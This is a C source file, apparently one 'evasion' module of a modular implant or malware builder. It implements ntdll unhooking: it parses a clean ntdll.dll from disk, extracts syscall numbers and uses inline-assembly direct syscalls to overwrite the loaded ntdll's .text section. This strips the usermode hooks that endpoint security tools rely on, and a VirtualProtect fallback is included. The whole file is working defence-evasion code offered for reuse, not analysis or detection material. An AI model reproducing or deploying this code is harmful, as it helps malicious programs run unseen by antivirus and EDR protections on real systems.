// chunk: evasion/unhook_heavens_gate
// depends: (none)
// provides: unhook_ntdll
// headers: windows.h
// risk: medium
// note: Direct syscall-based ntdll unhooking — resolves SSNs for NtProtectVirtualMemory
//       and NtWriteVirtualMemory from a clean disk copy of ntdll, then uses inline
//       syscall instructions to overwrite the hooked .text section. Bypasses any
//       usermode hooks on NtProtectVirtualMemory/NtWriteVirtualMemory since the
//       syscall instruction goes directly to the kernel, skipping the hooked stubs.
//       Named after Heaven's Gate (32->64 transition for WoW64); on native x64 this
//       is the direct-syscall variant achieving the same goal: bypass ntdll hooks.

#ifndef CHUNK_UNHOOK_HEAVENS_GATE
#define CHUNK_UNHOOK_HEAVENS_GATE

#include <windows.h>

/* SSN extraction from a clean ntdll stub.
   Clean stub pattern (x64):
     4C 8B D1          mov r10, rcx
     B8 XX XX 00 00    mov eax, <SSN>
     ...
   We scan the first 32 bytes of the function for this pattern. */
static DWORD _hg_resolve_ssn(BYTE *stub) {
    if (!stub) return (DWORD)-1;
    for (int i = 0; i < 32; i++) {
        if (stub[i] == 0x4C && stub[i+1] == 0x8B && stub[i+2] == 0xD1 &&
            stub[i+3] == 0xB8) {
            return *(DWORD *)(stub + i + 4);
        }
    }
    return (DWORD)-1;
}

/* Convert an RVA to a raw file offset using the section table */
static DWORD _hg_rva_to_raw(IMAGE_SECTION_HEADER *sec, WORD nsec, DWORD rva) {
    for (WORD i = 0; i < nsec; i++) {
        if (rva >= sec[i].VirtualAddress &&
            rva < sec[i].VirtualAddress + sec[i].Misc.VirtualSize) {
            return rva - sec[i].VirtualAddress + sec[i].PointerToRawData;
        }
    }
    return 0;
}

/* Find an exported function's stub in a raw (unmapped) PE file */
static BYTE *_hg_find_export_raw(BYTE *file_buf, IMAGE_SECTION_HEADER *sec,
                                  WORD nsec, const char *func_name) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)file_buf;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(file_buf + dos->e_lfanew);

    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return NULL;

    DWORD exp_off = _hg_rva_to_raw(sec, nsec, exp_rva);
    if (!exp_off) return NULL;

    IMAGE_EXPORT_DIRECTORY *exports = (IMAGE_EXPORT_DIRECTORY *)(file_buf + exp_off);

    DWORD *names = (DWORD *)(file_buf + _hg_rva_to_raw(sec, nsec, exports->AddressOfNames));
    WORD *ords = (WORD *)(file_buf + _hg_rva_to_raw(sec, nsec, exports->AddressOfNameOrdinals));
    DWORD *funcs = (DWORD *)(file_buf + _hg_rva_to_raw(sec, nsec, exports->AddressOfFunctions));

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        DWORD name_off = _hg_rva_to_raw(sec, nsec, names[i]);
        if (!name_off) continue;
        char *name = (char *)(file_buf + name_off);
        if (strcmp(name, func_name) == 0) {
            DWORD func_rva = funcs[ords[i]];
            DWORD func_off = _hg_rva_to_raw(sec, nsec, func_rva);
            if (!func_off) return NULL;
            return file_buf + func_off;
        }
    }
    return NULL;
}

/* Direct syscall wrapper for NtProtectVirtualMemory (SSN in eax, args in
   r10/rdx/r8/r9 per Windows x64 syscall ABI, 5th arg on stack) */
static NTSTATUS _hg_syscall_protect(DWORD ssn, HANDLE process, PVOID *base_addr,
                                     PSIZE_T region_size, ULONG new_protect,
                                     PULONG old_protect) {
    NTSTATUS status;
    __asm__ __volatile__ (
        "mov %[old_prot], %%rax\n\t"
        "push %%rax\n\t"                /* 5th arg: OldProtect ptr */
        "sub $0x20, %%rsp\n\t"          /* shadow space */
        "mov %[ssn_val], %%eax\n\t"     /* syscall number */
        "mov %[proc], %%r10\n\t"        /* arg1: ProcessHandle */
        "mov %[base], %%rdx\n\t"        /* arg2: BaseAddress ptr */
        "mov %[size], %%r8\n\t"         /* arg3: RegionSize ptr */
        "mov %[nprot], %%r9d\n\t"       /* arg4: NewProtect */
        "syscall\n\t"
        "add $0x28, %%rsp\n\t"          /* clean shadow + pushed arg */
        "mov %%eax, %[out]\n\t"
        : [out] "=m" (status)
        : [ssn_val] "r" (ssn),
          [proc] "r" (process),
          [base] "r" (base_addr),
          [size] "r" (region_size),
          [nprot] "r" (new_protect),
          [old_prot] "r" (old_protect)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );
    return status;
}

/* Direct syscall wrapper for NtWriteVirtualMemory */
static NTSTATUS _hg_syscall_write(DWORD ssn, HANDLE process, PVOID base_addr,
                                   PVOID buffer, SIZE_T size, PSIZE_T written) {
    NTSTATUS status;
    __asm__ __volatile__ (
        "mov %[wr], %%rax\n\t"
        "push %%rax\n\t"                /* 5th arg: NumberOfBytesWritten */
        "sub $0x20, %%rsp\n\t"          /* shadow space */
        "mov %[ssn_val], %%eax\n\t"     /* syscall number */
        "mov %[proc], %%r10\n\t"        /* arg1: ProcessHandle */
        "mov %[dst], %%rdx\n\t"         /* arg2: BaseAddress */
        "mov %[src], %%r8\n\t"          /* arg3: Buffer */
        "mov %[sz], %%r9\n\t"           /* arg4: NumberOfBytesToWrite */
        "syscall\n\t"
        "add $0x28, %%rsp\n\t"
        "mov %%eax, %[out]\n\t"
        : [out] "=m" (status)
        : [ssn_val] "r" (ssn),
          [proc] "r" (process),
          [dst] "r" (base_addr),
          [src] "r" (buffer),
          [sz] "r" (size),
          [wr] "r" (written)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );
    return status;
}

static int unhook_ntdll(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    /* Step 1: Read clean ntdll from disk as a raw file (not mapped as image) */
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat(path, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    DWORD file_size = GetFileSize(hFile, NULL);
    BYTE *file_buf = (BYTE *)VirtualAlloc(NULL, file_size,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!file_buf) { CloseHandle(hFile); return 0; }

    DWORD bytes_read;
    ReadFile(hFile, file_buf, file_size, &bytes_read, NULL);
    CloseHandle(hFile);

    if (bytes_read != file_size) {
        VirtualFree(file_buf, 0, MEM_RELEASE);
        return 0;
    }

    /* Step 2: Parse the raw file's section table */
    IMAGE_DOS_HEADER *f_dos = (IMAGE_DOS_HEADER *)file_buf;
    IMAGE_NT_HEADERS *f_nt = (IMAGE_NT_HEADERS *)(file_buf + f_dos->e_lfanew);
    IMAGE_SECTION_HEADER *f_sec = IMAGE_FIRST_SECTION(f_nt);
    WORD f_nsec = f_nt->FileHeader.NumberOfSections;

    /* Step 3: Resolve SSNs from the clean copy (guaranteed unhooked) */
    BYTE *clean_protect_stub = _hg_find_export_raw(file_buf, f_sec, f_nsec,
                                                    "NtProtectVirtualMemory");
    BYTE *clean_write_stub = _hg_find_export_raw(file_buf, f_sec, f_nsec,
                                                  "NtWriteVirtualMemory");

    DWORD ssn_protect = _hg_resolve_ssn(clean_protect_stub);
    DWORD ssn_write = _hg_resolve_ssn(clean_write_stub);

    if (ssn_protect == (DWORD)-1) {
        /* Cannot resolve SSN — fallback to standard unhook via VirtualProtect */
        HANDLE hMap = CreateFileMappingA(
            CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, 0, NULL),
            NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        VirtualFree(file_buf, 0, MEM_RELEASE);
        if (!hMap) return 0;

        void *clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
        if (!clean) { CloseHandle(hMap); return 0; }

        BYTE *base = (BYTE *)ntdll;
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
        IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
        IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                DWORD old;
                VirtualProtect(base + sec[i].VirtualAddress,
                               sec[i].Misc.VirtualSize,
                               PAGE_EXECUTE_READWRITE, &old);
                memcpy(base + sec[i].VirtualAddress,
                       (BYTE *)clean + sec[i].VirtualAddress,
                       sec[i].Misc.VirtualSize);
                VirtualProtect(base + sec[i].VirtualAddress,
                               sec[i].Misc.VirtualSize, old, &old);
                break;
            }
        }
        UnmapViewOfFile(clean);
        CloseHandle(hMap);
        return 1;
    }

    /* Step 4: Find .text section in currently loaded (hooked) ntdll */
    BYTE *hooked_base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)hooked_base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(hooked_base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    int restored = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

        BYTE *dest = hooked_base + sec[i].VirtualAddress;
        BYTE *src = file_buf + f_sec[i].PointerToRawData;
        DWORD size = sec[i].Misc.VirtualSize;

        /* Step 5: Direct syscall NtProtectVirtualMemory to make .text RWX */
        PVOID region_base = dest;
        SIZE_T region_size = size;
        ULONG old_protect = 0;

        NTSTATUS st = _hg_syscall_protect(ssn_protect, (HANDLE)(LONG_PTR)-1,
                                           &region_base, &region_size,
                                           PAGE_EXECUTE_READWRITE, &old_protect);
        if (st != 0) break;

        /* Step 6: Direct syscall NtWriteVirtualMemory to copy clean .text,
           or fall back to memcpy if NtWriteVirtualMemory SSN unavailable */
        if (ssn_write != (DWORD)-1) {
            SIZE_T written = 0;
            _hg_syscall_write(ssn_write, (HANDLE)(LONG_PTR)-1,
                              dest, src, size, &written);
        } else {
            memcpy(dest, src, size);
        }

        /* Step 7: Direct syscall NtProtectVirtualMemory to restore protection */
        region_base = dest;
        region_size = size;
        ULONG dummy;
        _hg_syscall_protect(ssn_protect, (HANDLE)(LONG_PTR)-1,
                            &region_base, &region_size,
                            old_protect ? old_protect : PAGE_EXECUTE_READ, &dummy);

        restored = 1;
        break;
    }

    VirtualFree(file_buf, 0, MEM_RELEASE);
    return restored;
}

#endif
